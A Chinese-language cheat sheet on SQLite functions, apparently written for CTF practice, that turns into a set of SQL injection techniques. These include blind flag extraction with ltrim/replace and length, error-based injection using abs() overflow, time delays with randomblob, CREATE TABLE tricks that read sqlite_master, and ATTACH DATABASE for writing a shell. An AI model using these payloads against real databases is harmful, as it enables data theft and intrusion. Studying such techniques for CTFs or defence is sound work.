sqlite基础

sqlite没有if和sleep语句

sqlite的||是拼接字符串

sqlite> select 123||4;
1234

注释

–空格

/* */

常规

select column1 from table where 1=1 and 2=2

sqlite数据类型

  • null
  • integer
  • real 浮点数
  • text 文本字符串 (utf-8,utf-16be或utf-16le 存储)
  • BLOB blob根据输入存储

数据库

创建数据库: $sqlite3 test.db

会在当前目录创建 test.db

sqlite> .databases #检查是否在数据库列表
main: /root/download/test.db

ATTACH附加数据库，如果没有则会创建

  • 可以利用这个来写shell
    sqlite> ATTACH DATABASE '/root/download/shell.db' as 'haah';
sqlite> .database
main: /root/download/test.db
haah: /root/download/shell.db

导出数据

sqlite> .dump #显示
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
COMMIT;
$sqlite3 testdb.db .dump >123.sql #导出到文件中

函数

abs()

如果整数是-9223372036854775808会溢出错误

coalesce()可以多个参数，返回第一个不是null的参数

select coalesce(null,'a','abbbb');
coalesce(null,'a','a')
----------------------
a         
select coalesce(nullif(2,2),'hah');
coalesce(nullif(2,2),'hah')
---------------------------
hah

相当于 if 2=2 return hah else null

hex,char

nullif 和 ifnull

  • nullif

两个参数，nullif(a,b),如果a和b相等返回 null

如果a和b不想等，返回 a

  • ifnull

和 coalesce()类似，不过只能两个参数，返回第一个非null

如果都为null，返回null

instr(a,b)

返回b在a出现的位置

length()

lower和 upper

max(a,b)

like(a,b)

相当于 b like a

可以用 _ % 

sqlite> select like('ab_','abc');
like('ab_','abc')
-----------------
1
  • like可以有第三个参数，

相当于like语句的 ESCAPE ，转义

在 % 或者 _ 前面添加什么字符可以把 %或者 _当作字符串

而不是匹配符号 

sqlite> select like('barz_','bar_','z');
like('barz_','bar_','z')
------------------------
1

这里把 z 用作 和 \ 类似的作用

ltrim(a) 和 ltrim(a,b)

删除左侧字符串

  • 一个参数 返回删除左侧空格的字符串
  • 两个参数 a,b ，返回删除空格和第二个参数b字符串
    sqlite> SELECT ltrim('aaaa bc','a');
ltrim('aaaa bc','a')
bc

rtrim(a)和 rtrim(a,b) 和ltrim类似

trim 就是 rtrim + ltrim

printf()

和普通的 格式化字符串一样 ，

sqlite> select printf("aw%s",'sl');

quote(a)

sqlite> SELECT quote('1233');

nullif 和 instr()

instr(a,b) 返回 b第一次出现在a的地方 ，

和nullif()一起用 如果是出现在1就返回null

select nullif(instr('abca','z'),1); //0

如果没有匹配到会返回0,这就和null一样效果

为了防止这种情况，在后面加上 ||1 拼接字符串

select nullif(instr('abca','b'),1)||1; // 21
select nullif(instr('abca','a'),1)||1;  //null
select nullif(instr('abca','ab'),1)||1; //null

利用 ltrim() 和length() 注入

使用length()获取字段的长度

select length("vote")=4;
sqlite> select length(ltrim("vote","vo"))=2;

然后ltrim() 函数从左往右爆破字符串，

如果爆破的字符串正确，那么length就会减少

同理 rtrim()/trim()和 length()

replace()和length()注入

最好前面有标识符号，flag{ 这样
和 ltrim 和 rtrim类似
不然麻烦

select  
length(replace('flag{aza}','flag{a',''))=3;
//1 

select length(replace('flag{aza}','flag{b',''))=3;
//0

ltrim() 和 length()和nullif()

select nullif(length(ltrim("vote","vo")),2);

nullif 和 length 和ltrim 配合

如果 正确返回null

case when then else end

select CASE  WHEN  1=1 THEN 1 ELSE 0 END ;//1
select CASE  WHEN  1=2 THEN 1 ELSE 0 END ; //0

利用abs()报错，ifnull(),nullif()

  • ifnull可以用coalesce()函数代替

  • abs()函数存在整形溢出

  • 当abs()参数是-9223372036854775808也就是0x8000000000000000
    就会报错

    sqlite> select abs(0x99999999999999999);
Error: hex literal too big: 0x99999999999999999

    所以基于报错的注入：

通过nullif和ifnull来决定是否报错
如果 1=1 就报错

select abs(ifnull(nullif(1,1),0x8000000000000000));
Error: integer overflow

select abs(ifnull(nullif(1,2),0x8000000000000000));
2

时间盲注 randomblob()

randomblob(n)可以产生n长度的字符串，足够长就可以延时

select case when substr('abc',1,1)='a' 
then randomblob(1000000) 
else 0 end;

CREATE注入

语句 :

create table [xx] as select
CREATE TABLE aa as select [a1][(123] from sec_tb ;

这样就是 (123 为列名， type 默认是 TEXT

创造一个表 aa ，

数据是从 sec_tb 的 a1列 复制过去的数据

获取表:

CREATE TABLE [cc] as select [sql][(123] from sqlite_master ;

获取数据

CREATE TABLE aa as select [a1][(123] from sec_tb ;
